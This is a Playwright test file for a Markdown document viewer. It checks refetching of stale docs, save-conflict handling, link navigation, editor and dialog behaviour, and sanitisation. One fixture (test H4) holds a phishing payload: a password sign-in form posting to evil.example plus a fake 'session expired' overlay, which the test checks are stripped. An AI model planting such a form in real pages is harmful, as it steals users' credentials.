import { test, expect, type Page } from '@playwright/test';

// GOLDEN H — the open doc is never stale, never written over, never a trap, and stays in Atlas.
//
// The tree and the docs are mocked (page.route), like golden B: each test sets the mind it needs.
//   - a doc changed elsewhere (new mtime in the tree) is fetched again when reopened;
//   - a checkbox tick on a doc that changed meanwhile sends the text it started from, and the 409
//     reloads the doc with a notice instead of overwriting it;
//   - a Markdown link to another doc opens it in place, and Back returns to the first one;
//   - a note can't draw a form or lift itself over the page;
//   - leaving the editor renders the doc through the normal path (no frontmatter as a heading);
//   - Enter on a dialog's Cancel cancels; `e` does nothing on a mirror of another atlas;
//   - the todos poll leaves an inline edit alone;
//   - Keep editing after a save conflict lets the next save through, on top of the new version.

// A fetch made by the service worker skips page.route: no worker, so every doc comes from the mocks.
test.use({ serviceWorkers: 'block' });

function file(path: string, mtime = 1781890000) {
  return { name: path.split('/').pop(), type: 'file', path, ext: '.' + path.split('.').pop(), mtime, words: 10, tags: [] };
}

function treeOf(...files: ReturnType<typeof file>[]) {
  const dirs = new Map<string, ReturnType<typeof file>[]>();

  for (const f of files) {
    const dir = f.path.split('/')[0];

    dirs.set(dir, [...(dirs.get(dir) || []), f]);
  }

  return { name: 'root', type: 'dir', children: [...dirs].map(([name, children]) => ({ name, type: 'dir', children })) };
}

// Serve `docs` (path → markdown) and a tree of them; returns a setter to change the tree later.
async function mind(page: Page, docs: Record<string, string>, mtimes: Record<string, number> = {}) {
  let tree = treeOf(...Object.keys(docs).map((p) => file(p, mtimes[p])));

  await page.route('**/api/tree', (route) => route.fulfill({ json: tree }));
  for (const path of Object.keys(docs)) {
    await page.route(new RegExp('/' + path.replace(/[.*+?^${}()|[\]\\/]/g, '\\$&') + '(\\?|$)'), (route) =>
      route.request().method() === 'GET' ? route.fulfill({ body: docs[path], contentType: 'text/markdown' }) : route.fallback());
  }

  return (next: ReturnType<typeof treeOf>) => {
    tree = next;
  };
}

async function open(page: Page, path: string) {
  await page.goto('/#' + encodeURIComponent(path), { waitUntil: 'domcontentloaded' });
  await page.waitForSelector('#content h1');
}

test('H1 — a doc changed elsewhere is fetched again when reopened', async ({ page }) => {
  const asked: string[] = [];

  await page.route(/\/docs\/live\.md\?v=/, (route) => {
    const v = new URL(route.request().url()).searchParams.get('v')!;

    asked.push(v);
    route.fulfill({ body: v === '200' ? '# Live\n\nnew text\n' : '# Live\n\nold text\n', contentType: 'text/markdown' });
  });
  const setTree = await mind(page, { 'docs/other.md': '# Other\n' });

  setTree(treeOf(file('docs/live.md', 100), file('docs/other.md')));
  await open(page, 'docs/live.md');
  await expect(page.locator('#content')).toContainText('old text');

  await page.locator('#tree a[data-path="docs/other.md"]').click();
  await expect(page.locator('#content h1')).toHaveText('Other');
  // An AI edit: the next tree carries the doc's new mtime.
  setTree(treeOf(file('docs/live.md', 200), file('docs/other.md')));
  await page.evaluate(() => window.softReload());
  await page.locator('#tree a[data-path="docs/live.md"]').click();

  await expect(page.locator('#content')).toContainText('new text');
  expect(asked).toEqual(['100', '200']);
});

test('H2 — a tick on a doc that changed meanwhile reloads it instead of writing over it', async ({ page }) => {
  const original = '# Tasks\n\n- [ ] write the tests\n';
  const current = '# Tasks\n\n- [ ] write the tests\n\nA line the AI added.\n';
  let sent: { base_content?: string } | null = null;

  await mind(page, { 'docs/tasks.md': original });
  await page.route('**/api/file', (route) => {
    if (route.request().method() !== 'PUT') return route.fallback();
    sent = route.request().postDataJSON();

    return route.fulfill({ status: 409, json: { error: 'changed since it was opened', current } });
  });
  await open(page, 'docs/tasks.md');

  await page.locator('#content input[type="checkbox"]').click();

  await expect(page.locator('.atlas-toast.show')).toBeVisible();
  await expect(page.locator('#content')).toContainText('A line the AI added.');
  await expect(page.locator('#content input[type="checkbox"]')).not.toBeChecked();
  expect(sent!.base_content).toBe(original);
});

test('H3 — a Markdown link to another doc opens it in place, Back returns', async ({ page }) => {
  await mind(page, { 'docs/a.md': '# A\n\n[go to b](b.md)\n', 'docs/b.md': '# B\n\nthe second doc\n' });
  await open(page, 'docs/a.md');
  await page.evaluate(() => ((window as unknown as { __sameDocument: boolean }).__sameDocument = true));

  await page.locator('#content a', { hasText: 'go to b' }).click();
  await expect(page.locator('#content h1')).toHaveText('B');
  expect(page.url()).toContain('#' + encodeURIComponent('docs/b.md'));

  await page.goBack();
  await expect(page.locator('#content h1')).toHaveText('A');
  // Never left the app: the page that set the flag is the one showing A again.
  expect(await page.evaluate(() => (window as unknown as { __sameDocument?: boolean }).__sameDocument)).toBe(true);
});

test('H4 — a note cannot draw a sign-in box or lift itself over the page', async ({ page }) => {
  await mind(page, {
    'docs/trap.md': '# Trap\n\n<style>#sidebar{display:none}</style>\n\n'
      + '<form action="https://evil.example"><input type="password" name="pw"><button>Sign in</button></form>\n\n'
      + '<div id="overlay" class="fixed inset-0 z-50" style="position:fixed;inset:0;z-index:99;color:rgb(255, 0, 0)">session expired</div>\n',
  });
  await open(page, 'docs/trap.md');

  await expect(page.locator('#content form, #content button:not(.doc-tag-add), #content style, #content input[type="password"]')).toHaveCount(0);
  const overlay = page.locator('#content [id$="overlay"]');

  await expect(overlay).toHaveCSS('position', 'static');
  await expect(overlay).toHaveCSS('color', 'rgb(255, 0, 0)');
});

test('H5 — leaving the editor renders the doc as it reads (no frontmatter heading)', async ({ page }) => {
  await mind(page, { 'docs/fm.md': '---\ntags: [demo]\n---\n# Titled\n\nbody\n' });
  await open(page, 'docs/fm.md');

  await page.keyboard.press('e');
  await page.locator('#md-editor').waitFor();
  await expect(page.locator('#md-preview')).not.toContainText('tags: [demo]');
  await page.locator('#btn-cancel').click();

  await expect(page.locator('#md-editor')).toHaveCount(0);
  await expect(page.locator('#content h1')).toHaveText('Titled');
  await expect(page.locator('#content')).not.toContainText('tags: [demo]');
});

test('H6 — Enter on a dialog\'s Cancel cancels', async ({ page }) => {
  await mind(page, { 'docs/d.md': '# D\n\ntext\n' });
  await open(page, 'docs/d.md');
  await page.keyboard.press('e');
  await page.locator('#md-editor').fill('changed');
  await page.locator('#btn-cancel').click();
  await expect(page.locator('#confirm-backdrop')).toBeVisible();

  await page.locator('#confirm-cancel').focus();
  await page.keyboard.press('Enter');
  await expect(page.locator('#confirm-backdrop')).toBeHidden();
  await expect(page.locator('#md-editor')).toHaveValue('changed'); // still editing, nothing lost
});

test('H7 — `e` stands down on a mirror of another atlas', async ({ page }) => {
  await mind(page, { 'remotes/node/m.md': '# Mirror\n' });
  await open(page, 'remotes/node/m.md');

  await page.keyboard.press('e');
  await expect(page.locator('#md-editor')).toHaveCount(0);
});

test('H8 — the todos poll leaves a todo being edited alone', async ({ page }) => {
  await page.route('**/api/todos', (route) =>
    route.request().method() === 'GET'
      ? route.fulfill({ json: [{ id: 1781890000123, text: 'buy bread', done: false, cat: 'work' }] })
      : route.fallback());
  await page.goto('/', { waitUntil: 'domcontentloaded' });
  await page.locator('#todo-list .todo-text', { hasText: 'buy bread' }).click();
  const input = page.locator('#todo-list .todo-edit');

  await input.fill('buy bread and milk');
  await page.waitForTimeout(10_500); // past one 10 s poll

  await expect(input).toHaveValue('buy bread and milk');
});

test('H9 — Keep editing after a conflict: the next save goes on top of the version that came in', async ({ page }) => {
  const current = '# C\n\ntext\n\nA line the AI added.\n';
  const sent: { base_content?: string }[] = [];

  await mind(page, { 'docs/c.md': '# C\n\ntext\n' });
  await page.route('**/api/file', (route) => {
    if (route.request().method() !== 'PUT') return route.fallback();
    sent.push(route.request().postDataJSON());

    return sent.length === 1
      ? route.fulfill({ status: 409, json: { error: 'changed since it was opened', current } })
      : route.fulfill({ json: { ok: true, mtime: 1781890100 } });
  });
  await open(page, 'docs/c.md');
  await page.keyboard.press('e');
  await page.locator('#md-editor').fill('# C\n\nmine\n');
  await page.locator('#btn-save').click();
  await expect(page.locator('#confirm-backdrop')).toBeVisible();

  await page.locator('#confirm-cancel').click();
  await expect(page.locator('#md-editor')).toHaveValue('# C\n\nmine\n');
  await page.locator('#btn-save').click();

  await expect(page.locator('#md-editor')).toHaveCount(0);
  expect(sent.map((b) => b.base_content)).toEqual(['# C\n\ntext\n', current]);
});
